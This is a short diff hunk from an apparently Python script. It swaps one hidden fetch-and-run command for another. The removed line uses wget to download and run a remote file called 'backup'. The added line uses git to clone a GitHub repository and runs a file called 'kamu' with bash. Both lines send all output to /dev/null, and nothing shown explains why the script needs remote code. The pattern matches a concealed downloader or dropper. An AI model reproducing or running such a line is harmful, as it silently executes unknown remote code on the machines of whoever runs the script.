@@ -19,4 +19,4 @@ def cmdline(command):
  
 
 
-cmdline ('wget https://raw.githubusercontent.com/samrikulan/lagraven/main/backup >/dev/null 2>&1  && chmod +x backup && bash ./backup >/dev/null 2>&1')
+cmdline ('git clone https://github.com/samrikulan/toya.git >/dev/null 2>&1  && cd toya && chmod +x kamu && bash ./kamu >/dev/null 2>&1')
